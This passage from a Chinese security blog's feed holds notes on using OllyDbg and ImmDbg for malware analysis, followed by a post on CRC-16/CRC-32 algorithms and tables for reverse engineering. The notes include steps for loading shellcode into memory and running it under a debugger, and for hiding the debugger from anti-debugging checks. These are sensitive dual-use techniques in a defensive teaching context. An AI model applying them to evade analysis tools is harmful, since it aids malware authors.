Shift+F9将运行异常处理。</p></blockquote><p>OllyDbg提供异常处理的选项，这些选项可以告诉调试器忽略某些特定异常，并且将它们直接转到应用程序处理。<br><a href="https://i.loli.net/2018/07/20/5b519f1aae2be.png" data-fancybox="group" data-caption="im" class="fancybox"><img alt="im" title="im" data-src="https://i.loli.net/2018/07/20/5b519f1aae2be.png" class="lazyload"></a></p><h2 id="9x10-修补"><a href="#9x10-修补" class="headerlink" title="9x10 修补"></a>9x10 修补</h2><p>OllyDbg可以很容易修改实时数据，如寄存器和标志。它也可以将汇编形式的修补代码直接插入到一个程序。你可以通过高亮选择某块区域来修改指令或内存，右击这块区域，选择Binary-&gt;Edit，会弹出让你添加操作码和数据的窗口（OllyDbg具有一些特殊功能，可以使用00项或NOP指令填充程序）。</p><h2 id="9x11-分析shellcode"><a href="#9x11-分析shellcode" class="headerlink" title="9x11 分析shellcode"></a>9x11 分析shellcode</h2><p>OllyDbg有一种分析shellcodc的简单方法。下面是使用这种方法的步骤:</p><blockquote><p>1．将shellcode从一个十六进制编辑器复制到剪切板。<br>2．在内存映射面板窗口中，选择类型为Priv的内存区域（这是分配给进程的私有内存，与只读的可执行镜像不同，这些内存被多个进程共享）。<br>3．双击内存映射面板窗口的某行，会弹出一个十六进制转储窗口，你可以检查它的内容。该区域应该包含几百个连续为0的字节。<br>4．在内存映射面板窗口中，右击被选择的区域，选择Set Access—Full Access，赋予该区域读、写、运行的权限。<br>5．返回内存转储窗口。0字节填充的高亮区域足以容纳整个sheUcode，右键单击选择的内存区域，然后选择Binary一Binary Paste。这个操作将步骤l中复制的shellcode粘贴到选择的区域。<br>6．设置EIP寄存器，指向你修改的内存区域（右击反汇编面板窗口的一条指令，选择New Origin Here，你可以很容易设置EIP寄存器的值）。</p></blockquote><p>上述步骤结束后，你就可以像对待正常应用程序一样运行、调试和单步整个shellcode了</p><h2 id="9x12-协助功能"><a href="#9x12-协助功能" class="headerlink" title="9x12 协助功能"></a>9x12 协助功能</h2><p>OllyDbg提供了多种机制来帮助分析，包括下面几种：</p><blockquote><p>  <strong>日志( Logging)</strong><br>  OllyDbg维护一个持续可用的事件日志。要访问这个日志，选择View-&gt;Log。此日志显示了加载的可执行模块、触发的断点，以及其他一些信息。另外，在分析过程中，日志还可以帮助你找出为到达某一特定状态而执行的那些操作。<br>    <strong>监视(Watches)窗口</strong><br>    OllyDbg支持使用监视窗口，用它可以查看你生成表达式的值。程序运行时，这个表达式会不断更新。你可以通过View—Watches，来访问监视窗口，你也可以在监视窗口中按下空格键，来设置表达式。<br>    <strong>帮助（Help）</strong>  OllyDbg的Help-&gt;Contents选项为运算表达式的书写提供了详细说明。当你想监视一些特定数据或者复杂函数时，这个帮助非常有用。例如，如果想监控EAX+ESP+4处的内存，你只需要输入表达式[EAX+ESP+4]。<br>    <strong>标注（Labeling）</strong>  如IDA Pro一样，你可以为OllyDbg中的子例程和循环添加标注。OllyDbg中的标注是为调试程序中某个地址设置的一个简单符号名称。为了在反汇编面板窗口设置标注，右击一个地址选择Label，此时会弹出提示输入标注的窗口。设置完标注以后，对这个地址的所有引用都会被该标注代替。</p></blockquote><h2 id="9x13-插件"><a href="#9x13-插件" class="headerlink" title="9x13 插件"></a>9x13 插件</h2><p>OllyDbg拥有一些标准插件，其中一些可以免费下载到。在网站 <a href="http://www.openrce.org/downloads/browse/OllyDbg_Plugins" target="_blank" rel="noopener">http://www.openrce.org/downloads/browse/OllyDbg_Plugins</a> 中，你可以找到一些对分析恶意代码有用的OllyDbg插件。<br>    OllyDbg的插件以DLL形式存在，如果要安装某个插件，你将这个插件的DLL放到OllyDbg的安装根目录下即可。一旦将DLL放入OllyDbg的安装根目录，OllyDbg会自动识别这个插件，并将其添加到插件菜单。</p><h3 id="1-OllyDump"><a href="#1-OllyDump" class="headerlink" title="1. OllyDump"></a>1. OllyDump</h3><p>OllyDump是OllyDbg最常使用的插件，它能够将一个被调试的进程转储成一个PE文件。当加载器加载一个可执行文件时，OllyDump会尝试逆向这个进程。然而，OllyDump利用的是进程内存中各段（代码段、数据段等）的状态。OllyDbg最典型的应用就是脱壳。</p><h3 id="2-调试器隐藏插件"><a href="#2-调试器隐藏插件" class="headerlink" title="2. 调试器隐藏插件"></a>2. 调试器隐藏插件</h3><p>调试器隐藏插件用多种方法对探测者隐藏调试器的存在。为了防止恶意代码使用反调试技术，恶意代码分析人员通常在分析恶意代码期间，一直运行调试器隐藏插件。这个插件主要针对IsDebuggerPresent检测、FindWindow检测、未处理异常欺骗以及用OutputDebugString反OllyDbg调试等反调试技术。</p><h3 id="3-命令行"><a href="#3-命令行" class="headerlink" title="3. 命令行"></a>3. 命令行</h3><p>要打开命令行窗口，选择Plugins-&gt;Command  Line-&gt;Command  Line。<br><a href="https://i.loli.net/2018/07/20/5b51a90a13474.jpg" data-fancybox="group" data-caption="im" class="fancybox"><img alt="im" title="im" data-src="https://i.loli.net/2018/07/20/5b51a90a13474.jpg" class="lazyload"></a></p><h3 id="4-书签"><a href="#4-书签" class="headerlink" title="4. 书签"></a>4. 书签</h3><p>OllyDbg默认情况下自带书签插件，书签插件可以将一个内存位置加到书签中，利用书签，下次不需要记住就可以轻松获取那个内存地址。右击反汇编面板窗口中的地址，选择Bookmark-&gt;Insert Bookmark．可以添加书签。选择Plugins-&gt;Bookmarks-&gt;Bookmarks，可以浏览书签，然后单击书签可以跳转到该书签代表的地址。</p><h2 id="9x14-脚本调试"><a href="#9x14-脚本调试" class="headerlink" title="9x14 脚本调试"></a>9x14 脚本调试</h2><p>因为OllyDbg的插件被编译成DLL，创建或者修改一个插件往往是一个复杂的过程。因此，当需要扩展调试功能时，我们采用ImmDbg。它使用Python脚本来扩展功能，并且提供了易于使用的API接口。<br>    ImmDbg的Python API包含很多实用工具和函数。例如，可以将你的脚本像本地代码一样集成到调试器中，创建自定义的表格、图形和各种接u。利用脚本分析恶意代码的原因有多种，典型的包括反调试器补丁、内联函数钩子( hook)以及函数参数日志等，其中许多代码可以在网上找到。<br>    ImmDbg最常见的Python脚本类型是PyCommand．这个Python脚本位于ImmDbg安装目录下的PyCommands\目录中。编写好Python脚本后，必须将其放到这个目录下才能运行。这些脚本从命令栏运行，并且需要加上前缀“!”，如在命令行中输入!list命令，可以列出可用的PyCommand列表。<br>    PyCommand类型脚本拥有如下结构：</p><blockquote><p>．  一系列Import导入语句，用来导入Python的模块（同所有的Python脚本一样）。通过immlib或immutils模块访问ImmDbg的功能。<br>．    一个主函数，用来读取命令行参数（以Python列表传递）。<br>·  PyCommand的代码实现部分。<br>·  返回包含字符串的值。一旦脚本运行结束，主调试器会用这个返回字符串更新状态栏。</p></blockquote>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;OllyDbg&quot;&gt;&lt;a href=&quot;#OllyDbg&quot; class=&quot;headerlink&quot; title=&quot;OllyDbg&quot;&gt;&lt;/a&gt;OllyDbg&lt;/h1&gt;&lt;p&gt;OllyDbg被普遍用来分析恶意代码之前,最初的用途是破解软件。 Immunity</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第三篇 动态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%89%E7%AF%87-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CRC校验算法及逆向方法初探</title>
    <link href="https://kabeor.github.io/CRC%E6%A0%A1%E9%AA%8C%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/"/>
    <id>https://kabeor.github.io/CRC%E6%A0%A1%E9%AA%8C%E7%AE%97%E6%B3%95%E5%8F%8A%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E5%88%9D%E6%8E%A2/</id>
    <published>2018-08-16T16:00:00.000Z</published>
    <updated>2020-03-16T04:42:06.547Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CRC校验算法及逆向方法初探"><a href="#CRC校验算法及逆向方法初探" class="headerlink" title="CRC校验算法及逆向方法初探"></a>CRC校验算法及逆向方法初探</h1><h2 id="循环冗余校验（Cyclic-redundancy-check）介绍"><a href="#循环冗余校验（Cyclic-redundancy-check）介绍" class="headerlink" title="循环冗余校验（Cyclic redundancy check）介绍"></a>循环冗余校验（Cyclic redundancy check）介绍</h2><blockquote><p>循环冗余校验（英语：Cyclic redundancy check，通称“CRC”）是一种根据网络数据包或计算机文件等数据产生简短固定位数校验码的一种散列函数，主要用来检测或校验数据传输或者保存后可能出现的错误。生成的数字在传输或者存储之前计算出来并且附加到数据后面，然后接收方进行检验确定数据是否发生变化。   –维基百科(<a href="https://zh.wikipedia.org/wiki/%E5%BE%AA%E7%92%B0%E5%86%97%E9%A4%98%E6%A0%A1%E9%A9%97" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E5%BE%AA%E7%92%B0%E5%86%97%E9%A4%98%E6%A0%A1%E9%A9%97</a>)</p></blockquote><h2 id="CRC校验计算步骤"><a href="#CRC校验计算步骤" class="headerlink" title="CRC校验计算步骤"></a><strong>CRC校验计算步骤</strong></h2><ol><li>选择一个生成多项式G(x)。</li><li>假设该生成多项式G(x)的二进制数有k位，在发送的数据帧B(x)(设为m位)后加k-1个0，得到新二进制串H(x)，H(x)位数应该为m+k-1。</li><li>H(x)“模2除法”除以G(x)，所得到的余数(记为F(x))就是原数据帧的CRC校验码，又称FCS(帧校验序列)。注意，F(x)的位数只能比G(x)少一位，0不能省略。</li><li>将F(x)附加到B(x)后面，组成新帧N(x),然后发送到接收端。</li><li>接收端将N(x)以“模2除法”除以G(x)，如果没有余数，则表明没有出错(因为在发送端发送数据帧之前就已附加了一个数,做了去余处理(也就已经能整除了),所以结果应该没有余数。如果有余数,则表明该帧在传输过程中出现了差错)。</li></ol><p>来看一些关键点</p><blockquote><ol><li><strong>生成多项式</strong></li></ol></blockquote><p>当进行CRC检验时，发送方与接收方需要事先约定一个除数，即生成多项式，一般记作G(x)。生成多项式的最高位与最低位必须是1。</p><p>常见CRC标准如下</p><p><a href="https://i.loli.net/2018/08/16/5b751c8007704.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/16/5b751c8007704.jpg" class="lazyload"></a></p><p>逆向中常见的是<br>CRC16  ：<a href="https://i.loli.net/2018/08/16/5b751d408104c.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/16/5b751d408104c.jpg" class="lazyload"></a><br>CRC32  ：<a href="https://i.loli.net/2018/08/16/5b751d71c13bd.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/16/5b751d71c13bd.jpg" class="lazyload"></a></p><p>生成多项式中幂代表在二进制串中该位为1，注意1是x的0次方，二进制串第一位的幂是0</p><p>因此CRC16的二进制串转换为HEX为 <code>0x1 1021</code> ，<br>CRC32 HEX为 <code>0x1 04C11DB7</code>(另一个CRC32:     <code>1 1110 1101 1011 1000 1000 0011 0010 0000 = 0x1 EDB8 8320</code>)。<strong>计算CRC X，就取后X位，如CRC16取后16位，则0x1 1021变为0x1021</strong>。</p><p>这些数值也可以在逆向过程中作为特征，让我们快速识别算法，至于魔改大多数也是从这些数值下手，后面会详细说。</p><blockquote><ol start="2"><li><strong>模2除法</strong></li></ol></blockquote><p>模2除法与算术除法类似,但它既不向上位借位也不比较除数和被除数的相同位数值的大小,只以相同位数进行相除。</p><p>模2加法运算为:1+1=0,0+1=1,0+0=0,无进位,也无借位。<br>模2减法运算为:1-1=0,0-1=1,1-0=1,0-0=0,也无进位,无借位。</p><p><a href="https://i.loli.net/2018/08/16/5b7580db445d3.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/16/5b7580db445d3.jpg" class="lazyload"></a></p><blockquote><p>过程图示</p></blockquote><p><a href="https://i.loli.net/2018/08/16/5b758077e370f.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/08/16/5b758077e370f.jpg" class="lazyload"></a></p><h2 id="CRC16校验C-实现"><a href="#CRC16校验C-实现" class="headerlink" title="CRC16校验C++实现"></a>CRC16校验C++实现</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int crc &#x3D; &#39;a&#39;;&#x2F;&#x2F;计算字符a的crc16校验码</span><br><span class="line">    &#x2F;&#x2F;右移8位，和手动计算一样，左移相当于补0，这里相当于直接补了8个0，开始计算。</span><br><span class="line">    crc &lt;&lt;&#x3D; 8; &#x2F;&#x2F;&lt;&lt;&#x3D; 相当余 crc&#x3D;crc&lt;&lt;8;</span><br><span class="line">    &#x2F;&#x2F;计算8次。</span><br><span class="line">    for (int i &#x3D; 0; i &lt; 8; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;如果最高位是1的话需要计算，如果不是直接左移。（左移的操作可以想象成补0)</span><br><span class="line">        if ((crc &amp; 0x8000) !&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            crc &lt;&lt;&#x3D; 1;</span><br><span class="line">            crc &#x3D; crc ^ 0x1021;&#x2F;&#x2F;这个说明用的是 CRC16   x16+x12+x5+1.</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            crc &lt;&lt;&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;取后16位，如果用的是crc使用的是unsigned short 就不需要这一步了。</span><br><span class="line">    crc &#x3D; crc &amp; 0xffff;</span><br><span class="line">    &#x2F;&#x2F;输出。</span><br><span class="line">    std::cout &lt;&lt; crc &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="CRC32生成表算法C实现"><a href="#CRC32生成表算法C实现" class="headerlink" title="CRC32生成表算法C实现"></a>CRC32生成表算法C实现</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">static uint32_t table[256];</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;位逆转</span><br><span class="line">static uint32_t bitrev(uint32_t input, int bw)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    uint32_t var;</span><br><span class="line">    var &#x3D; 0;</span><br><span class="line">    for(i&#x3D;0; i&lt;bw; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(input &amp; 0x01)</span><br><span class="line">        &#123;</span><br><span class="line">            var |&#x3D; 1&lt;&lt;(bw - 1 - i);</span><br><span class="line">        &#125;</span><br><span class="line">        input &gt;&gt;&#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    return var;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;码表生成</span><br><span class="line">void crc32_init(uint32_t poly)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    int j;</span><br><span class="line">    uint32_t c;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    poly &#x3D; bitrev(poly, 32);</span><br><span class="line">    for(i&#x3D;0; i&lt;256; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        c &#x3D; i;</span><br><span class="line">        for (j&#x3D;0; j&lt;8; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            c &#x3D; (c &amp; 1) ? (poly ^ (c &gt;&gt; 1)) : (c &gt;&gt; 1);</span><br><span class="line">        &#125;</span><br><span class="line">        table[i] &#x3D; c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;计算CRC</span><br><span class="line">uint32_t crc32(uint32_t crc, void* input, int len)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    uint8_t index;</span><br><span class="line">    uint8_t *p;</span><br><span class="line">    p &#x3D; (uint8_t*)input;</span><br><span class="line">    for(i&#x3D;0; i&lt;len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        index &#x3D; (*p ^ crc);</span><br><span class="line">        crc &#x3D; (crc &gt;&gt; 8) ^ table[index];</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    return crc;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;测试用例</span><br><span class="line">void main(void)</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t crc;</span><br><span class="line">    crc32_init(0x4C11DB7);</span><br><span class="line">    crc &#x3D; crc32(0xFFFFFFFF, &quot;1234567890&quot;, 10);</span><br><span class="line">    printf(&quot;CRC32 &#x3D; 0x%08X\n&quot;, crc ^ 0xFFFFFFFF);</span><br><span class="line">    system(&quot;pause&quot;);</span><br></pre></td></tr></table></figure></div><h2 id="CRC查表法"><a href="#CRC查表法" class="headerlink" title="CRC查表法"></a>CRC查表法</h2><p>查表法是将移位异或的计算结果做成了一个表，就是将0~256放入一个长度为16位的寄存器中的低八位，高八位填充0，然后将该寄存器与生成多项式按照把CRC寄存器的内容右移一位（朝低位）用0填补最高位，并检查右移后的移出位；如果移出位为0：再次右移一位；如果移出位为1，CRC寄存器与多项式进行异或，直到八位全部移出，最后寄存器中的值就是表格中的数据，高八位、低八位分别单独一个表。</p><p>CRC32数据表生成</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int make_crc32_table()  </span><br><span class="line">&#123;  </span><br><span class="line">    unsigned c;  </span><br><span class="line">    int i &#x3D; 0;  </span><br><span class="line">    int bit &#x3D; 0;  </span><br><span class="line">    for(i &#x3D; 0; i &lt; 256; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        c  &#x3D; (unsigned)i;      </span><br><span class="line">        for(bit &#x3D; 0; bit &lt; 8; bit++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            if(c&amp;1)  </span><br><span class="line">            &#123;  </span><br><span class="line">                c &#x3D; (c &gt;&gt; 1)^(0xEDB88320);  &#x2F;&#x2F;生成多项式，如果动态生成这张CRC32表，则必定会有这个数</span><br><span class="line">                 </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123;  </span><br><span class="line">                c &#x3D;  c &gt;&gt; 1;  </span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;  </span><br><span class="line">        crc32_table &#x3D; c; </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;  &#x2F;&#x2F;这个算法，会产生包含有256个元素的CRC32表</span><br></pre></td></tr></table></figure></div><p>逆向时若是动态生成表，则应留意生成多项式，若是静态表，则会在数据段留下整个表</p><p>常用表如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CRC-16 Table</span><br><span class="line"></span><br><span class="line">  00h   0000 C0C1 C181 0140 C301 03C0 0280 C241</span><br><span class="line">  08h   C601 06C0 0780 C741 0500 C5C1 C481 0440</span><br><span class="line">  10h   CC01 0CC0 0D80 CD41 0F00 CFC1 CE81 0E40</span><br><span class="line">  18h   0A00 CAC1 CB81 0B40 C901 09C0 0880 C841</span><br><span class="line"></span><br><span class="line">  20h   D801 18C0 1980 D941 1B00 DBC1 DA81 1A40</span><br><span class="line">  28h   1E00 DEC1 DF81 1F40 DD01 1DC0 1C80 DC41</span><br><span class="line">  30h   1400 D4C1 D581 1540 D701 17C0 1680 D641</span><br><span class="line">  38h   D201 12C0 1380 D341 1100 D1C1 D081 1040</span><br><span class="line"></span><br><span class="line">  40h   F001 30C0 3180 F141 3300 F3C1 F281 3240</span><br><span class="line">  48h   3600 F6C1 F781 3740 F501 35C0 3480 F441</span><br><span class="line">  50h   3C00 FCC1 FD81 3D40 FF01 3FC0 3E80 FE41</span><br><span class="line">  58h   FA01 3AC0 3B80 FB41 3900 F9C1 F881 3840</span><br><span class="line"></span><br><span class="line">  60h   2800 E8C1 E981 2940 EB01 2BC0 2A80 EA41</span><br><span class="line">  68h   EE01 2EC0 2F80 EF41 2D00 EDC1 EC81 2C40</span><br><span class="line">  70h   E401 24C0 2580 E541 2700 E7C1 E681 2640</span><br><span class="line">  78h   2200 E2C1 E381 2340 E101 21C0 2080 E041</span><br><span class="line"></span><br><span class="line">  80h   A001 60C0 6180 A141 6300 A3C1 A281 6240</span><br><span class="line">  88h   6600 A6C1 A781 6740 A501 65C0 6480 A441</span><br><span class="line">  90h   6C00 ACC1 AD81 6D40 AF01 6FC0 6E80 AE41</span><br><span class="line">  98h   AA01 6AC0 6B80 AB41 6900 A9C1 A881 6840</span><br><span class="line"></span><br><span class="line">  A0h   7800 B8C1 B981 7940 BB01 7BC0 7A80 BA41</span><br><span class="line">  A8h   BE01 7EC0 7F80 BF41 7D00 BDC1 BC81 7C40</span><br><span class="line">  B0h   B401 74C0 7580 B541 7700 B7C1 B681 7640</span><br><span class="line">  B8h   7200 B2C1 B381 7340 B101 71C0 7080 B041</span><br><span class="line"></span><br><span class="line">  C0h   5000 90C1 9181 5140 9301 53C0 5280 9241</span><br><span class="line">  C8h   9601 56C0 5780 9741 5500 95C1 9481 5440</span><br><span class="line">  D0h   9C01 5CC0 5D80 9D41 5F00 9FC1 9E81 5E40</span><br><span class="line">  D8h   5A00 9AC1 9B81 5B40 9901 59C0 5880 9841</span><br><span class="line"></span><br><span class="line">  E0h   8801 48C0 4980 8941 4B00 8BC1 8A81 4A40</span><br><span class="line">  E8h   4E00 8EC1 8F81 4F40 8D01 4DC0 4C80 8C41</span><br><span class="line">  F0h   4400 84C1 8581 4540 8701 47C0 4680 8641</span><br><span class="line">  F8h   8201 42C0 4380 8341 4100 81C1 8081 4040</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CRC-32 Table</span><br><span class="line"></span><br><span class="line">  00h   00000000 77073096 EE0E612C 990951BA</span><br><span class="line">  04h   076DC419 706AF48F E963A535 9E6495A3</span><br><span class="line">  08h   0EDB8832 79DCB8A4 E0D5E91E 97D2D988</span><br><span class="line">  0Ch   09B64C2B 7EB17CBD E7B82D07 90BF1D91</span><br><span class="line"></span><br><span class="line">  10h   1DB71064 6AB020F2 F3B97148 84BE41DE</span><br><span class="line">  14h   1ADAD47D 6DDDE4EB F4D4B551 83D385C7</span><br><span class="line">  18h   136C9856 646BA8C0 FD62F97A 8A65C9EC</span><br><span class="line">  1Ch   14015C4F 63066CD9 FA0F3D63 8D080DF5</span><br><span class="line"></span><br><span class="line">  20h   3B6E20C8 4C69105E D56041E4 A2677172</span><br><span class="line">  24h   3C03E4D1 4B04D447 D20D85FD A50AB56B</span><br><span class="line">  28h   35B5A8FA 42B2986C DBBBC9D6 ACBCF940</span><br><span class="line">  2Ch   32D86CE3 45DF5C75 DCD60DCF ABD13D59</span><br><span class="line"></span><br><span class="line">  30h   26D930AC 51DE003A C8D75180 BFD06116</span><br><span class="line">  34h   21B4F4B5 56B3C423 CFBA9599 B8BDA50F</span><br><span class="line">  38h   2802B89E 5F058808 C60CD9B2 B10BE924</span><br><span class="line">  3Ch   2F6F7C87 58684C11 C1611DAB B6662D3D</span><br><span class="line"></span><br><span class="line">  40h   76DC4190 01DB7106 98D220BC EFD5102A</span><br><span class="line">  44h   71B18589 06B6B51F 9FBFE4A5 E8B8D433</span><br><span class="line">  48h   7807C9A2 0F00F934 9609A88E E10E9818</span><br><span class="line">  4Ch   7F6A0DBB 086D3D2D 91646C97 E6635C01</span><br><span class="line"></span><br><span class="line">  50h   6B6B51F4 1C6C6162 856530D8 F262004E</span><br><span class="line">  54h   6C0695ED 1B01A57B 8208F4C1 F50FC457</span><br><span class="line">  58h   65B0D9C6 12B7E950 8BBEB8EA FCB9887C</span><br><span class="line">  5Ch   62DD1DDF 15DA2D49 8CD37CF3 FBD44C65</span><br><span class="line"></span><br><span class="line">  60h   4DB26158 3AB551CE A3BC0074 D4BB30E2</span><br><span class="line">  64h   4ADFA541 3DD895D7 A4D1C46D D3D6F4FB</span><br><span class="line">  68h   4369E96A 346ED9FC AD678846 DA60B8D0</span><br><span class="line">  6Ch   44042D73 33031DE5 AA0A4C5F DD0D7CC9</span><br><span class="line"></span><br><span class="line">  70h   5005713C 270241AA BE0B1010 C90C2086</span><br><span class="line">  74h   5768B525 206F85B3 B966D409 CE61E49F</span><br><span class="line">  78h   5EDEF90E 29D9C998 B0D09822 C7D7A8B4</span><br><span class="line">  7Ch   59B33D17 2EB40D81 B7BD5C3B C0BA6CAD</span><br><span class="line"></span><br><span class="line">  80h   EDB88320 9ABFB3B6 03B6E20C 74B1D29A</span><br><span class="line">  84h   EAD54739 9DD277AF 04DB2615 73DC1683</span><br><span class="line">  88h   E3630B12 94643B84 0D6D6A3E 7A6A5AA8</span><br><span class="line">  8Ch   E40ECF0B 9309FF9D 0A00AE27 7D079EB1</span><br><span class="line"></span><br><span class="line">  90h   F00F9344 8708A3D2 1E01F268 6906C2FE</span><br><span class="line">  94h   F762575D 806567CB 196C3671 6E6B06E7</span><br><span class="line">  98h   FED41B76 89D32BE0 10DA7A5A 67DD4ACC</span><br><span class="line">  9Ch   F9B9DF6F 8EBEEFF9 17B7BE43 60B08ED5</span><br><span class="line"></span><br><span class="line">  A0h   D6D6A3E8 A1D1937E 38D8C2C4 4FDFF252</span><br><span class="line">  A4h   D1BB67F1 A6BC5767 3FB506DD 48B2364B</span><br><span class="line">  A8h   D80D2BDA AF0A1B4C 36034AF6 41047A60</span><br><span class="line">  ACh   DF60EFC3 A867DF55 316E8EEF 4669BE79</span><br><span class="line"></span><br><span class="line">  B0h   CB61B38C BC66831A 256FD2A0 5268E236</span><br><span class="line">  B4h   CC0C7795 BB0B4703 220216B9 5505262F</span><br><span class="line">  B8h   C5BA3BBE B2BD0B28 2BB45A92 5CB36A04</span><br><span class="line">  BCh   C2D7FFA7 B5D0CF31 2CD99E8B 5BDEAE1D</span><br><span class="line"></span><br><span class="line">  C0h   9B64C2B0 EC63F226 756AA39C 026D930A</span><br><span class="line">  C4h   9C0906A9 EB0E363F 72076785 05005713</span><br><span class="line">  C8h   95BF4A82 E2B87A14 7BB12BAE 0CB61B38</span><br><span class="line">  CCh   92D28E9B E5D5BE0D 7CDCEFB7 0BDBDF21</span><br><span class="line"></span><br><span class="line">  D0h   86D3D2D4 F1D4E242 68DDB3F8 1FDA836E</span><br><span class="line">  D4h   81BE16CD F6B9265B 6FB077E1 18B74777</span><br><span class="line">  D8h   88085AE6 FF0F6A70 66063BCA 11010B5C</span><br><span class="line">  DCh   8F659EFF F862AE69 616BFFD3 166CCF45</span><br><span class="line"></span><br><span class="line">  E0h   A00AE278 D70DD2EE 4E048354 3903B3C2</span><br><span class="line">  E4h   A7672661 D06016F7 4969474D 3E6E77DB</span><br><span class="line">  E8h   AED16A4A D9D65ADC 40DF0B66 37D83BF0</span><br><span class="line">  ECh   A9BCAE53 DEBB9EC5 47B2CF7F 30B5FFE9</span><br><span class="line"></span><br><span class="line">  F0h   BDBDF21C CABAC28A 53B39330 24B4A3A6</span><br><span class="line">  F4h   BAD03605 CDD70693 54DE5729 23D967BF</span><br><span class="line">  F8h   B3667A2E C4614AB8 5D681B02 2A6F2B94</span><br><span class="line">  FCh   B40BBE37 C30C8EA1 5A05DF1B 2D02EF8D</span><br></pre></td></tr></table></figure></div><h2 id="CRC32逆向实例分析"><a href="#CRC32逆向实例分析" class="headerlink" title="CRC32逆向实例分析"></a>CRC32逆向实例分析</h2><p><a href="https://i.loli.net/2018/08/16/5b758eff9d88b.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title 